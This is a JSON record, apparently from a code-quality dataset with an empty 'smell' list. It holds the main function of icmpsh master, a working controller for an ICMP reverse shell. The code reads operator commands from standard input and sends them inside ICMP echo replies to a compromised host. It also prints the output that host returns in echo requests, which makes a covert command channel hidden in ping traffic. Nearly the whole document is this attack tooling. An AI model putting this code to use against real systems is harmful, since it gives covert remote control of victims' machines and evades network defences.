{
    "code": "def main(src, dst):\n    if subprocess.mswindows:\n        sys.stderr.write('icmpsh master can only run on Posix systems\\n')\n        sys.exit(255)\n\n    try:\n        from impacket import ImpactDecoder\n        from impacket import ImpactPacket\n    except ImportError:\n        sys.stderr.write('You need to install Python Impacket library first\\n')\n        sys.exit(255)\n\n    # Make standard input a non-blocking file\n    stdin_fd = sys.stdin.fileno()\n    setNonBlocking(stdin_fd)\n\n    # Open one socket for ICMP protocol\n    # A special option is set on the socket so that IP headers are included\n    # with the returned data\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    except socket.error:\n        sys.stderr.write('You need to run icmpsh master with administrator privileges\\n')\n        sys.exit(1)\n\n    sock.setblocking(0)\n    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n    # Create a new IP packet and set its source and destination addresses\n    ip = ImpactPacket.IP()\n    ip.set_ip_src(src)\n    ip.set_ip_dst(dst)\n\n    # Create a new ICMP packet of type ECHO REPLY\n    icmp = ImpactPacket.ICMP()\n    icmp.set_icmp_type(icmp.ICMP_ECHOREPLY)\n\n    # Instantiate an IP packets decoder\n    decoder = ImpactDecoder.IPDecoder()\n\n    while True:\n        cmd = ''\n\n        # Wait for incoming replies\n        if sock in select.select([ sock ], [], [])[0]:\n            buff = sock.recv(4096)\n\n            if 0 == len(buff):\n                # Socket remotely closed\n                sock.close()\n                sys.exit(0)\n\n            # Packet received; decode and display it\n            ippacket = decoder.decode(buff)\n            icmppacket = ippacket.child()\n\n            # If the packet matches, report it to the user\n            if ippacket.get_ip_dst() == src and ippacket.get_ip_src() == dst and 8 == icmppacket.get_icmp_type():\n                # Get identifier and sequence number\n                ident = icmppacket.get_icmp_id()\n                seq_id = icmppacket.get_icmp_seq()\n                data = icmppacket.get_data_as_string()\n\n                if len(data) > 0:\n                    sys.stdout.write(data)\n\n                # Parse command from standard input\n                try:\n                    cmd = sys.stdin.readline()\n                except:\n                    pass\n\n                if cmd == 'exit\\n':\n                    return\n\n                # Set sequence number and identifier\n                icmp.set_icmp_id(ident)\n                icmp.set_icmp_seq(seq_id)\n\n                # Include the command as data inside the ICMP packet\n                icmp.contains(ImpactPacket.Data(cmd))\n\n                # Calculate its checksum\n                icmp.set_icmp_cksum(0)\n                icmp.auto_checksum = 1\n\n                # Have the IP packet contain the ICMP packet (along with its payload)\n                ip.contains(icmp)\n\n                # Send it to the target host\n                sock.sendto(ip.get_packet(), (dst, 0))",
    "smell": []
}